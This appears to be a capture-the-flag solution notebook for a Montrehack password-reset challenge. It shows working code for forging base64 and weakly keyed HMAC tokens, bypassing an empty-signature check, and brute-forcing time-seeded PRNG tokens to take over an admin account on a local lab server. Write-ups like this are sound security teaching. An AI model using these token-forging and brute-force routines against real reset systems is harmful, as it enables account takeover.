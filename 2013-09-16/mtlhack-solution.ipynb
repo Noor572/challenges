{
 "metadata": {
  "name": "mtlhack-solution"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "heading",
     "level": 4,
     "metadata": {},
     "source": [
      "Note: This is a python 2.7.x notebook."
     ]
    },
    {
     "cell_type": "heading",
     "level": 1,
     "metadata": {},
     "source": [
      "Level 1"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "https://127.0.0.1:1337/b4d463e5-8f93-448c-af83-02eb2ba23873/?t=dGVzdEBtb250cmVoYWNrLmNh"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": true,
     "input": [
      "import base64\n",
      "base64.b64decode('dGVzdEBtb250cmVoYWNrLmNh')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "pyout",
       "prompt_number": 20,
       "text": [
        "'test@montrehack.ca'"
       ]
      }
     ],
     "prompt_number": 20
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "base64.b64encode(b'admin@montrehack.ca')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "pyout",
       "prompt_number": 21,
       "text": [
        "'YWRtaW5AbW9udHJlaGFjay5jYQ=='"
       ]
      }
     ],
     "prompt_number": 21
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "https://127.0.0.1:1337/b4d463e5-8f93-448c-af83-02eb2ba23873/?t=YWRtaW5AbW9udHJlaGFjay5jYQ=="
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Base64 is not a strong _encryption_ algorithm! \n",
      "\n",
      "https://127.0.0.1:1337/64096cb9-80c9-4994-99c4-45251ec38b4c/"
     ]
    },
    {
     "cell_type": "heading",
     "level": 1,
     "metadata": {},
     "source": [
      "Level 2"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "https://127.0.0.1:1337/64096cb9-80c9-4994-99c4-45251ec38b4c/?t=Ym9iQGRlc2phcmRpbnMuY29t|f77bd0e64b05b431f8cd617811c7af0430f2dc82"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Show code"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import base64\n",
      "import hmac\n",
      "import hashlib\n",
      "\n",
      "def create_token(email):\n",
      "    \"\"\"\n",
      "    Creates a token and apply a hashmac so the user can't tamper it.\n",
      "    :param email: User's email\n",
      "    :return: a password reset token\n",
      "    \"\"\"\n",
      "    token = base64.b64encode(email.encode())\n",
      "    mac = hmac.new(email.encode(), token, hashlib.sha1)\n",
      "    return token.decode() + \"|\" + str(mac.hexdigest())\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 22
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "The HMAC is insecure! It uses the user email as the secret key."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "create_token('admin@montrehack.ca')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "pyout",
       "prompt_number": 23,
       "text": [
        "u'YWRtaW5AbW9udHJlaGFjay5jYQ==|883d65bbc5b7ef38e65bc261282e7ad10cc3f8c0'"
       ]
      }
     ],
     "prompt_number": 23
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Make sure you don't use a weak key for your hmac! \n",
      "\n",
      "https://127.0.0.1:1337/70d684e8-f6c4-4081-b18c-4a71dda11816/"
     ]
    },
    {
     "cell_type": "heading",
     "level": 1,
     "metadata": {},
     "source": [
      "Level 3"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "https://127.0.0.1:1337/70d684e8-f6c4-4081-b18c-4a71dda11816/?t=cmVycg==|ee\n",
      "\n",
      "        VS\n",
      "        \n",
      "https://127.0.0.1:1337/70d684e8-f6c4-4081-b18c-4a71dda11816/?t=cmVycg==|"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "def get_token_components(token):\n",
      "    \"\"\"\n",
      "    Decode and split the user supplied token\n",
      "    :param token: user supplied token\n",
      "    :return: the mail and signature value\n",
      "    \"\"\"\n",
      "    mail = None                               # DANGER\n",
      "    signature = None                          # DANGER\n",
      "    if not token or token == \"\":\n",
      "        return mail, signature\n",
      "    if \"|\" not in token:\n",
      "        return mail, signature\n",
      "    values = token.split(\"|\")\n",
      "    try: \n",
      "        mail = base64.b64decode(values[0]).decode()\n",
      "        signature = values[1]\n",
      "    except binascii.Error:\n",
      "        return mail, signature\n",
      "    except UnicodeDecodeError:\n",
      "        return mail, signature\n",
      "    except Exception:                        # DANGER\n",
      "        return mail, signature\n",
      "    return mail, signature\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 25
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# elif reset_token:\n",
      "#            mail, signature = get_token_components(reset_token)               \n",
      "#            if signature and not validate_token(reset_token):                  # WILL BE SKIPPED IF SIGNATURE == NONE\n",
      "#                self.render(\"templates/error.html\", message=\"Invalid data.\")\n",
      "#            elif mail == config.admin_email:                                   # EMAIL IS SET!!!      \n",
      "#                base_url = utils.get_cosmetic_url(self.request)\n",
      "#                self.render(\"templates/success.html\",\n",
      "#                    message=config.level3_message,\n",
      "#                    next_challenge=base_url + config.level4_link\n",
      "#                )"
     ],
     "language": "python",
     "metadata": {},
     "outputs": []
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import base64\n",
      "base64.b64encode(b'admin@montrehack.ca')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "pyout",
       "prompt_number": 26,
       "text": [
        "'YWRtaW5AbW9udHJlaGFjay5jYQ=='"
       ]
      }
     ],
     "prompt_number": 26
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "https://127.0.0.1:1337/70d684e8-f6c4-4081-b18c-4a71dda11816/?t=YWRtaW5AbW9udHJlaGFjay5jYQ==|"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Even if you use strong and proven algorithms, make sure the implementation is right! \n",
      "\n",
      "https://127.0.0.1:1337/0dbc7c23-01a4-498c-a4c4-02f0ed7ccb55/"
     ]
    },
    {
     "cell_type": "heading",
     "level": 1,
     "metadata": {},
     "source": [
      "Level 4"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Input admin@montrehack.ca as the email"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "The reset link has been sent to the admin's email."
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Input bob@montrehack.ca as the email"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "https://127.0.0.1:1337/70d684e8-f6c4-4081-b18c-4a71dda11816/?t=MjY5OTU4MzM4NzgyNDE3MTU1MDE4NDI2Nzc3Nzk5Njc5MjI3ODkw"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import base64\n",
      "import random\n",
      "import time\n",
      "\n",
      "def create_token():\n",
      "    \"\"\"\n",
      "    Creates a random reset token.\n",
      "    :return: a password reset token\n",
      "    \"\"\"\n",
      "    # Get a large random number http://docs.python.org/3.3/library/random.html\n",
      "    seed_value = int(time.time() * 256)\n",
      "    random.seed(seed_value)\n",
      "    random_bits = random.getrandbits(128)\n",
      "    token = base64.b64encode(str(random_bits).encode())\n",
      "    return token.decode()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "create_token()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "pyout",
       "prompt_number": 3,
       "text": [
        "u'MTE5MDAzOTI3MDI1NzgyMjIyNTgyNjMxMjEzOTQ3MDY4ODQ2ODkz'"
       ]
      }
     ],
     "prompt_number": 3
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Random token :("
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "But wait!!!"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Server Response:\n",
      "    Content-Length:987\n",
      "    Content-Type:text/html; charset=UTF-8\n",
      "    Date:Sun, 15 Sep 2013 20:30:55 GMT\n",
      "    Etag:\"4bf0bd96f85f05ffc29dda45bb59336b2b043f65\"\n",
      "    Server:TornadoServer/3.1.1"
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "We have the server time!!!"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import time\n",
      "\n",
      "now = time.strptime(\"Mon, 16 Sep 2013 09:12:26 GMT\", \"%a, %d %b %Y %H:%M:%S %Z\")\n",
      "since = time.mktime(now)\n",
      "seed = int(since * 256)\n",
      "print(seed)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "353111230976\n"
       ]
      }
     ],
     "prompt_number": 4
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "FACT: Under Windows, the seed is ALWAYS based on int(time.time() * 256)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#if a is None:\n",
      "#    try:\n",
      "#        a = int.from_bytes(_urandom(32), 'big')\n",
      "#    except NotImplementedError:\n",
      "#        import time\n",
      "#        a = int(time.time() * 256) # use fractional seconds\n",
      "\n",
      "#if version == 2:\n",
      "#    if isinstance(a, (str, bytes, bytearray)):\n",
      "#        if isinstance(a, str):\n",
      "#            a = a.encode()\n",
      "#        a += _sha512(a).digest()\n",
      "#        a = int.from_bytes(a, 'big')\n",
      "\n",
      "#super().seed(a)\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 5
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import base64\n",
      "import random\n",
      "import time\n",
      "\n",
      "def generate_seed(server_timestamp):\n",
      "    target = time.strptime(server_timestamp, \"%a, %d %b %Y %H:%M:%S %Z\")\n",
      "    since = time.mktime(target)\n",
      "    seed = int(since * 256)\n",
      "    return seed\n",
      "    \n",
      "def create_fake_token(seed):\n",
      "    \"\"\"\n",
      "    Creates a random reset token.\n",
      "    :return: a password reset token\n",
      "    \"\"\"\n",
      "    random.seed(seed)\n",
      "    random_bits = random.getrandbits(128)\n",
      "    token = base64.b64encode(str(random_bits).encode())\n",
      "    return token.decode()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 6
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Lets generate some known values:\n",
      "\n",
      "    - The server token generated for a known email \"bob@bob.com\"\n",
      "    - The server timestamp at the time the token is generated"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "server_time = \"Mon, 16 Sep 2013 09:12:26 GMT\"\n",
      "server_generated_token = \"Mjc4NjU0OTM2MTc3MDQ3MTI1NDI5Njk1MTM1MjI2MTYzNzcxODY5\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Now we compute an estimated seed for the given time"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "server_seed = generate_seed(server_time)\n",
      "print(server_seed)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "353111230976\n"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "And we generate the token"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "token = create_fake_token(server_seed)\n",
      "token == server_generated_token"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "pyout",
       "prompt_number": 9,
       "text": [
        "False"
       ]
      }
     ],
     "prompt_number": 9
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Crap! :)\n",
      "\n",
      "We lose the milliseconds in the seeding process, so we need to bruteforce them to find the correct seed.\n",
      "\n",
      "We have everything we need!"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "def crack_seed(computed_seed, server_token):\n",
      "    original_seed = computed_seed\n",
      "    while computed_seed > 0:\n",
      "        token = create_fake_token(computed_seed)\n",
      "        if token == server_token:\n",
      "            print(\"Found seed at: \" + str(computed_seed) + \" with offset: \" + str(original_seed - computed_seed))\n",
      "            return computed_seed\n",
      "        computed_seed -= 1\n",
      "    return 0"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 10
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Very important: Server time is UTC!! you need to convert it to the local time you think the server runs."
     ]
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "We need some heuristic.\n",
      "    - The server is my laptop\n",
      "    - Time should be relative to current time!"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "server_time = \"Mon, 16 Sep 2013 13:12:26 GMT\"\n",
      "guessed_server_time = \"Mon, 16 Sep 2013 09:12:28 GMT\" # -4 + Just a bit higher, let's say 1-2 seconds.\n",
      "server_token = \"Mjc4NjU0OTM2MTc3MDQ3MTI1NDI5Njk1MTM1MjI2MTYzNzcxODY5\"\n",
      "guessed_server_seed = generate_seed(guessed_server_time)\n",
      "\n",
      "# Lets crack the seed to see if we're hitting near\n",
      "real_seed = crack_seed(guessed_server_seed, server_token)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Found seed at: 353110309475 with offset: 922013\n"
       ]
      }
     ],
     "prompt_number": 12
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Now we compute the real offset. original computed seed - found seed"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "computed_offset = generate_seed(server_time) - real_seed\n",
      "print(\"Offset from server time: \" + str(computed_offset))"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Offset from server time: 4607901\n"
       ]
      }
     ],
     "prompt_number": 14
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "We now know that we should hit the token pretty fast. \n",
      "\n",
      "But first, a reminder:\n",
      " Since we can't predict the milliseconds, there will always be a guess of +- 1000 for the seed. \n",
      " The bruteforce function need the generated seed to be greater than the real seed to succeed\n",
      " Since we substract the offset to the server seed, we substract 1000ms to allow the guess to be always slightly overshot."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "computed_offset -= 1000"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 15
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "server_time = \"Mon, 16 Sep 2013 13:18:02 GMT\"\n",
      "server_token = \"MTM1MDgzODc0MTQ5NTExMDQ4MTgyNTczMTM3MzY5NDQzODYyODYy\"\n",
      "server_seed = generate_seed(server_time) - computed_offset\n",
      "print server_seed\n",
      "\n",
      "# Lets crack again to see if we're hitting near\n",
      "found_seed = crack_seed(server_seed, server_token)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "353110396491\n",
        "Found seed at: 353110395488 with offset: 1003\n"
       ]
      }
     ],
     "prompt_number": 16
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "server_time = \"Mon, 16 Sep 2013 13:18:36 GMT\"\n",
      "server_token = \"MTA4NzY2MjQ3NTM1MTk1ODU0OTI3NTM0OTU2OTczNDM0NTg1NDc0\"\n",
      "server_seed = generate_seed(server_time) - computed_offset\n",
      "print server_seed\n",
      "\n",
      "# Lets crack again to see if we're hitting near\n",
      "found_seed = crack_seed(server_seed, server_token)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "353110405195\n",
        "Found seed at: 353110404234 with offset: 961\n"
       ]
      }
     ],
     "prompt_number": 17
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "We need a small helper function to generate the candidate with a +- 2000ms tolerance"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "def generate_candidates(server_time, count):\n",
      "    candidates =[]\n",
      "    for x in range(2000, 0, -1):\n",
      "        server_seed = generate_seed(server_time) - computed_offset - x\n",
      "        candidates.append(create_fake_token(server_seed))\n",
      "    return candidates"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 18
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "Lets try with a known value (found earlier)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# Test with known values\n",
      "server_time = \"Mon, 16 Sep 2013 13:18:36 GMT\"\n",
      "server_token = \"MTA4NzY2MjQ3NTM1MTk1ODU0OTI3NTM0OTU2OTczNDM0NTg1NDc0\"\n",
      "candidates = generate_candidates(server_time, 2000)\n",
      "server_token in candidates"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "pyout",
       "prompt_number": 19,
       "text": [
        "True"
       ]
      }
     ],
     "prompt_number": 19
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "We are now pretty confident on the server seed to generate our admin account token.\n",
      "\n",
      "Lets put admin@montrehack.ca as our email and note the timestamp"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# With admin@montrehack.ca\n",
      "server_time = \"Mon, 16 Sep 2013 13:20:06 GMT\"\n",
      "admin_candidates = generate_candidates(server_time, 2000)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 20
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "And we bruteforce the server until we get the link!"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import urllib2\n",
      "\n",
      "for candidate in admin_candidates:\n",
      "    response = urllib2.urlopen(\"https://127.0.0.1:1337/0dbc7c23-01a4-498c-a4c4-02f0ed7ccb55/?t=\" + candidate)\n",
      "    html = response.read()\n",
      "    response.close()\n",
      "    if \"<title>Error\" not in html and \"HoHo!\" not in html:\n",
      "        print(\"Token found!: \" + candidate)\n",
      "        break\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Token found!: Mjk1NDQ1Mzk1OTYxMzU2NjY0ODA5NjYwMDY3NTQ4NDIxMzA2NTE4\n"
       ]
      }
     ],
     "prompt_number": 21
    },
    {
     "cell_type": "raw",
     "metadata": {},
     "source": [
      "PRNGs can be evil! (Under Windows, python's random.seed() is always based on system time! \n",
      "\n",
      "https://127.0.0.1:1337/b4d463e5-8f93-448c-af83-02eb2ba23873/"
     ]
    }
   ],
   "metadata": {}
  }
 ]
}